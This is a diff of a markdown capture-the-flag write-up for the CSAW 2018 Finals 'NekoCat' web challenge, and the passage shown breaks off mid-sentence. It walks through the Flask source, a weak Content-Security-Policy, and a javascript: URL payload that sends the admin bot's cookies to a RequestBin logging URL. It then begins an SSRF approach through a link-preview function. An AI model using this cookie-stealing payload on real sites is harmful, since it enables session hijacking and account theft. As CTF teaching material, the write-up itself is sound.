@@ -10,7 +10,7 @@ The website is similar to twitter, where users can create and send posts about w
 
 ![Imgur](https://i.imgur.com/KoROMvT.png)
 
-Looking at the zip, we see it's the complete source code of the website, and that it's running the Flask web framework. We see some interesting information in flagon.py:
+Looking at the zip, we see it's the complete source code of the website, and that it's running the Flask web framework. We see some interesting information in [flagon.py](https://github.com/DDOS-Attacks/ctf-writeups/blob/master/2018/CSAW%20CTF%202018%20Finals/Web/NekoCat/flagon/flagon.py):
 
 ```python
 SECRET_KEY = os.environ.get("FLAGON_SECRET_KEY", "")
@@ -55,4 +55,102 @@ class Flagon(object):
 ````
 In order to get the value of SECRET_KEY, we have to be able to access http://web.chal.csaw.io:1003/flaginfo. Trying to directly access it returns a 404, which makes sense because according to the source code, we can only view the webpage if our ip address is `127.0.0.1` or localhost. Obviously we aren't localhost, so we need to find a different approach.
 
-In app.py
+In [app.py](https://github.com/DDOS-Attacks/ctf-writeups/blob/master/2018/CSAW%20CTF%202018%20Finals/Web/NekoCat/app.py), we see the following:
+
+```python
+@app.route('/report')
+@apply_csp
+def report(request):
+    #: neko checks for naughtiness
+    #: neko likes links
+    pass
+```
+
+This implies that there's some "admin" that automatically will click on any links we have in our post. With these type of problems, you normally want to exploit some type of XSS vulnerability so you can steal an admin's cookies. Normally with XSS vulnerability, you have to be able to inject some javascript into an html tag, but in this question we can only control a link. However, if we look at the csp, there's a way to achieve XSS with only a link:
+
+```python
+def apply_csp(f):
+    @wraps(f)
+    def decorated_func(*args, **kwargs):
+        resp = f(*args, **kwargs)
+        csp = "; ".join([
+                "default-src 'self' 'unsafe-inline'",
+                "style-src " + " ".join(["'self'",
+                                         "*.bootstrapcdn.com",
+                                         "use.fontawesome.com"]),
+                "font-src " + "use.fontawesome.com",
+                "script-src " + " ".join(["'unsafe-inline'",
+                                          "'self'",
+                                          "cdnjs.cloudflare.com",
+                                          "*.bootstrapcdn.com",
+                                          "code.jquery.com"]),
+                "connect-src " + "*"
+              ])
+        resp.headers["Content-Security-Policy"] = csp
+
+        return resp
+    return decorated_func
+```
+
+For `script-src`, we see that `unsafe-inline` is allowed. Looking at [this](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src) link, it explains what `unsafe-inline` means:
+
+```
+'unsafe-inline'
+Allows the use of inline resources, such as inline <script> elements, javascript: URLs, inline event handlers, and inline <style> elements. You must include the single quotes.
+```
+
+We can use `javascript:` URLs to leverage XSS! A `javascript:` URL will allow us to execute javascript, so we can obtain the admin's cookies. For example if our url was this:
+
+```javascript
+javascript:document.location='http://www.google.com/'
+```
+
+And the admin clicks on that link, then he would be redirected to www.google.com! Now we construct our own link to steal the admin's cookies. The payload is as follows:
+
+```javascript
+javascript:document.location="http://requestbin.fullcontact.com/zfbxyqzf?"+document.cookie
+```
+
+![Imgur](https://i.imgur.com/JKVQiIv.png)
+
+RequestBin is a simple site to log HTTP requests, so we can use the service to log the request the admin makes when he clicks on the link, to steal his cookies. AFter creating our post, all we need to do is click on the report link and watch the magic happen.
+
+![Imgur](https://i.imgur.com/KEb29NL.png)
+
+We have successfully obtained the admin's cookies, but what do we do with this now? Also take note with value of the `Referer` header:
+
+```
+Referer: http://127.0.0.1:5000/post?id=20809&instance=cf665777-b943-42ad-bf5e-332f8fc7d2ed
+```
+
+The ip address is `127.0.0.1`! This means the admin is running localhost, so we can abuse this to access `/flaginfo`! Looking at app.py again:
+
+```python
+def get_post_preview(url):
+    scheme, netloc, path, query, fragment = url_parse(url)
+
+    # No oranges allowed
+    if scheme != 'http' and scheme != 'https':
+        return None
+
+    if '..' in path:
+        return None
+
+    if path.startswith('/flaginfo'):
+        return None
+
+    try:
+        r = requests.get(url, allow_redirects=False)
+    except Exception:
+        return None
+
+    soup = BeautifulSoup(r.text, 'html.parser')
+    if soup.body:
+        result = ''.join(soup.body.findAll(text=True)).strip()
+        result = ' '.join(result.split())
+        return result[:280]
+
+    return None
+```
+
+Using this `get_post_preview`, we can make the 
